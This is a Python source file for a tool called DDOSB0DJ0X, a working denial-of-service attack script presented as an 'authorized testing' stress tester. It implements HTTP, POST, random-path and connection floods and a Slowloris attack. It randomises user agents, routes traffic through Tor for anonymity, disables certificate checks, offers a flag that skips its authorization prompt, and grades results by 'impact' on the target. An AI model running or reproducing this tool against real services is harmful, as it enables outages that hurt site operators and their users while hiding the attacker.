#!/usr/bin/env python3
"""
DDOSB0DJ0X -- DDoS Simulation & Stress Testing Tool for Authorized Testing Only
"""

import sys, os, json, time, argparse, random, threading, statistics, socket
from datetime import datetime
from urllib.parse import urlparse, quote
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    sys.exit("[!] pip install requests")
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.live import Live
    from rich import box
except ImportError:
    sys.exit("[!] pip install rich")

console = Console()
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ASCII = [
    "██████╗ ███████╗ ██████╗ █████╗ ███████╗ ██████╗  █████╗ ███████╗████████╗",
    "██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝ ██╔══██╗██╔════╝╚══██╔══╝",
    "██║  ██║█████╗  ██║     ███████║█████╗  ██║  ███╗███████║█████╗     ██║   ",
    "██║  ██║██╔══╝  ██║     ██╔══██║██╔══╝  ██║   ██║██╔══██║██╔══╝     ██║   ",
    "██████╔╝███████╗╚██████╗██║  ██║██║     ╚██████╔╝██║  ██║███████╗   ██║   ",
    "╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   ",
]

DISCLAIMER = """
[bold red]  ██████████████████████████████████████████████████████████████████████████████
  ██  WARNING: FOR AUTHORIZED TESTING ONLY                                      ██
  ██  Only use against targets you OWN or have WRITTEN AUTHORIZATION to test. ██
  ██  Unauthorized use is ILLEGAL and may result in criminal prosecution.      ██
  ██████████████████████████████████████████████████████████████████████████████[/bold red]
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/115.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36",
]

METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

PAYLOAD_SIZES = {"tiny": 100, "small": 1024, "medium": 10240, "large": 102400, "huge": 1048576}

SLOWLORIS_HEADERS = ["X-a: 1", "X-b: 2", "X-c: 3", "X-d: 4", "X-e: 5", "X-f: 6"]


def banner():
    console.clear()
    for l in ASCII:
        console.print(f"[bold red]{l}[/bold red]", justify="center")
    console.print()
    console.print("[bold white]  DDoS Simulation & Stress Testing Tool for Authorized Testing Only[/bold white]", justify="center")
    console.print("[bold red]  Made by b0dj0x · https://b0dj0x.cc[/bold red]\n")
    console.print(DISCLAIMER)


class StressStats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.success = 0
        self.failed = 0
        self.bytes_sent = 0
        self.bytes_recv = 0
        self.errors = {}
        self.start_time = None
        self.resp_times = deque(maxlen=1000)
        self.rps_history = deque(maxlen=60)
        self._last_time = None
        self._last_count = 0
        self.status_codes = {}

    def start(self):
        self.start_time = time.time()
        self._last_time = time.time()

    def record(self, ok, sent=0, recv=0, error=None, resp_time=0, status=0):
        with self.lock:
            self.total += 1
            if ok:
                self.success += 1
            else:
                self.failed += 1
                if error:
                    self.errors[error] = self.errors.get(error, 0) + 1
            if status:
                self.status_codes[str(status)] = self.status_codes.get(str(status), 0) + 1
            self.bytes_sent += sent
            self.bytes_recv += recv
            if resp_time > 0:
                self.resp_times.append(resp_time)

    def rps(self):
        with self.lock:
            now = time.time()
            elapsed = now - self._last_time if self._last_time else 1
            if elapsed >= 1:
                val = (self.total - self._last_count) / elapsed
                self.rps_history.append(val)
                self._last_time = now
                self._last_count = self.total
                return val
            return self.rps_history[-1] if self.rps_history else 0

    def uptime(self):
        return time.time() - self.start_time if self.start_time else 0

    def avg_resp(self):
        return statistics.mean(self.resp_times) if self.resp_times else 0

    def p95_resp(self):
        if self.resp_times:
            s = sorted(self.resp_times)
            return s[min(int(len(s) * 0.95), len(s) - 1)]
        return 0

    def avg_rps(self):
        return statistics.mean(self.rps_history) if self.rps_history else 0

    def peak_rps(self):
        return max(self.rps_history) if self.rps_history else 0


class HTTPRaper:
    def __init__(self, target, threads=50, duration=30, timeout=5, mode="http",
                 method="GET", payload="small", tor=False, slow_rate=10,
                 slow_timeout=30, custom_headers=None):
        self.target = target.rstrip("/")
        self.threads = threads
        self.duration = duration
        self.timeout = timeout
        self.mode = mode
        self.method = method.upper()
        self.payload = payload
        self.tor = tor
        self.slow_rate = slow_rate
        self.slow_timeout = slow_timeout
        self.custom_headers = custom_headers or {}
        self.stats = StressStats()
        self.running = False
        self.session = self._make_session()

    def _make_session(self):
        s = requests.Session()
        s.verify = False
        if self.tor:
            s.proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        return s

    def _headers(self):
        h = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "application/json", "*/*", "text/plain",
            ]),
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "de-DE,de;q=0.9"]),
            "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity"]),
            "Connection": random.choice(["keep-alive", "close"]),
        }
        h.update(self.custom_headers)
        return h

    def _payload_data(self):
        return "A" * PAYLOAD_SIZES.get(self.payload, 1024)

    def _http_flood(self):
        while self.running:
            try:
                h = self._headers()
                t0 = time.time()
                if self.method == "GET":
                    r = self.session.get(self.target, headers=h, timeout=self.timeout)
                elif self.method == "POST":
                    r = self.session.post(self.target, headers=h, data=self._payload_data(), timeout=self.timeout)
                elif self.method == "PUT":
                    r = self.session.put(self.target, headers=h, data=self._payload_data(), timeout=self.timeout)
                elif self.method == "DELETE":
                    r = self.session.delete(self.target, headers=h, timeout=self.timeout)
                elif self.method == "HEAD":
                    r = self.session.head(self.target, headers=h, timeout=self.timeout)
                elif self.method == "OPTIONS":
                    r = self.session.options(self.target, headers=h, timeout=self.timeout)
                else:
                    r = self.session.get(self.target, headers=h, timeout=self.timeout)
                dt = time.time() - t0
                self.stats.record(True, len(str(h)), len(r.content), resp_time=dt, status=r.status_code)
            except requests.exceptions.Timeout:
                self.stats.record(False, error="timeout")
            except requests.exceptions.ConnectionError:
                self.stats.record(False, error="conn_error")
            except Exception as e:
                self.stats.record(False, error=type(e).__name__)

    def _slowloris(self):
        while self.running:
            try:
                parsed = urlparse(self.target)
                host = parsed.hostname
                port = parsed.port or (443 if parsed.scheme == "https" else 80)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.slow_timeout)
                sock.connect((host, port))
                if parsed.scheme == "https":
                    import ssl
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                for _ in range(5):
                    for hdr in SLOWLORIS_HEADERS:
                        try:
                            sock.send(f"{hdr}\r\n".encode())
                            time.sleep(0.05)
                        except:
                            break
                while self.running:
                    try:
                        sock.send(f"{random.choice(SLOWLORIS_HEADERS)}\r\n".encode())
                        time.sleep(1.0 / self.slow_rate)
                    except:
                        break
                self.stats.record(True, 512, 0)
                try: sock.close()
                except: pass
            except:
                self.stats.record(False, error="slowloris_err")
                time.sleep(0.5)

    def _random_path(self):
        while self.running:
            try:
                path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(5, 12)))
                h = self._headers()
                t0 = time.time()
                r = self.session.get(self.target + path, headers=h, timeout=self.timeout)
                dt = time.time() - t0
                self.stats.record(True, len(str(h)), len(r.content), resp_time=dt, status=r.status_code)
            except requests.exceptions.Timeout:
                self.stats.record(False, error="timeout")
            except requests.exceptions.ConnectionError:
                self.stats.record(False, error="conn_error")
            except:
                self.stats.record(False, error="unknown")

    def _post_flood(self):
        while self.running:
            try:
                h = self._headers()
                h["Content-Type"] = random.choice([
                    "application/json", "application/x-www-form-urlencoded", "text/plain",
                ])
                data = self._payload_data()
                t0 = time.time()
                r = self.session.post(self.target, headers=h, data=data, timeout=self.timeout)
                dt = time.time() - t0
                self.stats.record(True, len(data), len(r.content), resp_time=dt, status=r.status_code)
            except requests.exceptions.Timeout:
                self.stats.record(False, error="timeout")
            except requests.exceptions.ConnectionError:
                self.stats.record(False, error="conn_error")
            except:
                self.stats.record(False, error="unknown")

    def _conn_flood(self):
        while self.running:
            try:
                h = self._headers()
                h["Connection"] = "keep-alive"
                t0 = time.time()
                r = self.session.get(self.target, headers=h, timeout=self.timeout)
                dt = time.time() - t0
                self.stats.record(True, 500, len(r.content), resp_time=dt, status=r.status_code)
            except requests.exceptions.Timeout:
                self.stats.record(True, error="timeout")
            except requests.exceptions.ConnectionError:
                self.stats.record(False, error="conn_error")
            except:
                self.stats.record(False, error="unknown")

    def _handler(self):
        return {
            "http": self._http_flood,
            "slowloris": self._slowloris,
            "random": self._random_path,
            "post": self._post_flood,
            "connection": self._conn_flood,
        }.get(self.mode, self._http_flood)

    def run(self):
        self.running = True
        self.stats.start()
        handler = self._handler()

        console.print(f"\n[bold cyan]  Configuration:[/bold cyan]\n")
        console.print(f"  Target:    {self.target}")
        console.print(f"  Mode:      {self.mode}")
        console.print(f"  Method:    {self.method}")
        console.print(f"  Threads:   {self.threads}")
        console.print(f"  Duration:  {self.duration}s")
        console.print(f"  Timeout:   {self.timeout}s")
        console.print(f"  Payload:   {self.payload} ({PAYLOAD_SIZES.get(self.payload, 0)} bytes)")
        console.print(f"  Tor:       {'Yes' if self.tor else 'No'}\n")

        console.print("[bold red]  Starting in 3...[/bold red]")
        time.sleep(1)
        console.print("[bold red]  2...[/bold red]")
        time.sleep(1)
        console.print("[bold red]  1...[/bold red]")
        time.sleep(1)
        console.print("[bold red]  GO![/bold red]\n")

        end = time.time() + self.duration

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(handler) for _ in range(self.threads)]
            try:
                with Live(console=console, refresh_per_second=4) as live:
                    while time.time() < end and self.running:
                        rps = self.stats.rps()
                        remain = max(0, end - time.time())
                        table = Table(box=box.SIMPLE, show_header=False)
                        table.add_column("K", style="cyan", width=16)
                        table.add_column("V", style="white")
                        table.add_row("Target", self.target[:50])
                        table.add_row("Mode", f"{self.mode} ({self.method})")
                        table.add_row("Threads", str(self.threads))
                        table.add_row("Remaining", f"{remain:.1f}s")
                        table.add_row("Requests", f"{self.stats.total:,}")
                        table.add_row("Success", f"[green]{self.stats.success:,}[/green]")
                        table.add_row("Failed", f"[red]{self.stats.failed:,}[/red]")
                        table.add_row("RPS", f"[yellow]{rps:.1f}[/yellow]")
                        table.add_row("Avg RPS", f"{self.stats.avg_rps():.1f}")
                        table.add_row("Sent", f"{self.stats.bytes_sent / 1048576:.2f} MB")
                        table.add_row("Recv", f"{self.stats.bytes_recv / 1048576:.2f} MB")
                        table.add_row("Avg RT", f"{self.stats.avg_resp() * 1000:.0f}ms")
                        table.add_row("P95 RT", f"{self.stats.p95_resp() * 1000:.0f}ms")
                        if self.stats.errors:
                            errs = ", ".join(f"{k}:{v}" for k, v in sorted(self.stats.errors.items(), key=lambda x: x[1], reverse=True)[:3])
                            table.add_row("Errors", errs)
                        live.update(Panel(table, title="[bold red]DDOSB0DJ0X Running[/bold red]", border_style="red"))
                        time.sleep(0.25)
            except KeyboardInterrupt:
                self.running = False

        self.running = False
        time.sleep(1)

    def report(self):
        console.print(f"\n[bold cyan]  === Stress Test Report ===[/bold cyan]\n")
        t = Table(box=box.ROUNDED, show_lines=True)
        t.add_column("Metric", style="cyan", width=25)
        t.add_column("Value", style="white", width=30)
        t.add_row("Target", self.target)
        t.add_row("Mode", f"{self.mode} ({self.method})")
        t.add_row("Duration", f"{self.duration}s (actual: {self.stats.uptime():.1f}s)")
        t.add_row("Threads", str(self.threads))
        t.add_row("Total Requests", f"{self.stats.total:,}")
        t.add_row("Success", f"[green]{self.stats.success:,}[/green]")
        t.add_row("Failed", f"[red]{self.stats.failed:,}[/red]")
        rate = (self.stats.success / max(1, self.stats.total)) * 100
        t.add_row("Success Rate", f"{rate:.1f}%")
        t.add_row("Avg RPS", f"{self.stats.avg_rps():.1f}")
        t.add_row("Peak RPS", f"{self.stats.peak_rps():.1f}")
        t.add_row("Data Sent", f"{self.stats.bytes_sent / 1048576:.2f} MB")
        t.add_row("Data Recv", f"{self.stats.bytes_recv / 1048576:.2f} MB")
        t.add_row("Avg Response", f"{self.stats.avg_resp() * 1000:.0f}ms")
        t.add_row("P95 Response", f"{self.stats.p95_resp() * 1000:.0f}ms")
        if self.stats.status_codes:
            codes = ", ".join(f"{k}:{v}" for k, v in sorted(self.stats.status_codes.items()))
            t.add_row("Status Codes", codes)
        if self.stats.errors:
            for err, cnt in sorted(self.stats.errors.items(), key=lambda x: x[1], reverse=True):
                t.add_row(f"Error: {err}", f"[red]{cnt:,}[/red]")
        console.print(t)

        if rate > 80:
            console.print(f"\n[bold yellow]  Result: HIGH IMPACT -- Target stressed significantly[/bold yellow]")
        elif rate > 50:
            console.print(f"\n[bold yellow]  Result: MODERATE IMPACT -- Some load detected[/bold yellow]")
        elif rate > 20:
            console.print(f"\n[bold yellow]  Result: LOW IMPACT -- Target partially responsive[/bold yellow]")
        else:
            console.print(f"\n[bold yellow]  Result: MINIMAL IMPACT -- Target resilient or unreachable[/bold yellow]")

    def export(self, filename):
        data = {
            "target": self.target, "mode": self.mode, "method": self.method,
            "threads": self.threads, "duration": self.duration,
            "timestamp": datetime.now().isoformat(),
            "stats": {
                "total": self.stats.total, "success": self.stats.success,
                "failed": self.stats.failed, "bytes_sent": self.stats.bytes_sent,
                "bytes_recv": self.stats.bytes_recv, "avg_rps": self.stats.avg_rps(),
                "peak_rps": self.stats.peak_rps(),
                "avg_resp_ms": self.stats.avg_resp() * 1000,
                "p95_resp_ms": self.stats.p95_resp() * 1000,
                "errors": self.stats.errors, "status_codes": self.stats.status_codes,
            },
        }
        with open(filename, "w") as f:
            json.dump(data, f, indent=2)
        console.print(f"\n[green]  Report saved to {filename}[/green]")


def main():
    p = argparse.ArgumentParser(
        prog="ddosb0dj0x",
        description="DDOSB0DJ0X -- DDoS Simulation & Stress Testing Tool for Authorized Testing Only")
    p.add_argument("target", help="Target URL")
    p.add_argument("--mode", choices=["http", "slowloris", "random", "post", "connection"],
                   default="http", help="Attack mode (default: http)")
    p.add_argument("--method", choices=METHODS, default="GET", help="HTTP method (default: GET)")
    p.add_argument("--threads", type=int, default=50, help="Threads (default: 50)")
    p.add_argument("--duration", type=int, default=30, help="Duration in seconds (default: 30)")
    p.add_argument("--timeout", type=int, default=5, help="Request timeout (default: 5)")
    p.add_argument("--payload", choices=list(PAYLOAD_SIZES.keys()), default="small", help="Payload size")
    p.add_argument("--tor", action="store_true", help="Route through Tor")
    p.add_argument("--slow-rate", type=int, default=10, help="Slowloris keep-alive rate")
    p.add_argument("--slow-timeout", type=int, default=30, help="Slowloris socket timeout")
    p.add_argument("--header", action="append", default=[], help="Custom header (key:value)")
    p.add_argument("-o", "--output", help="Export report JSON")
    p.add_argument("--yes", action="store_true", help="Skip confirmation")

    args = p.parse_args()
    banner()

    if not args.yes:
        console.print("[bold yellow]  Do you have AUTHORIZATION to test this target?[/bold yellow]")
        console.print("  Type [bold green]YES[/bold green] to continue or Ctrl+C to abort.\n")
        try:
            if input("  > ").strip() != "YES":
                console.print("[red]  Aborted.[/red]")
                return
        except (KeyboardInterrupt, EOFError):
            console.print("\n[red]  Aborted.[/red]")
            return

    ch = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            ch[k.strip()] = v.strip()

    tool = HTTPRaper(
        target=args.target, threads=args.threads, duration=args.duration,
        timeout=args.timeout, mode=args.mode, method=args.method,
        payload=args.payload, tor=args.tor, slow_rate=args.slow_rate,
        slow_timeout=args.slow_timeout, custom_headers=ch,
    )

    try:
        tool.run()
    except KeyboardInterrupt:
        tool.running = False
        console.print("\n[yellow]  Stopped.[/yellow]")

    tool.report()
    if args.output:
        tool.export(args.output)
    console.print("\n[bold green]  Done.[/bold green]\n")


if __name__ == "__main__":
    main()
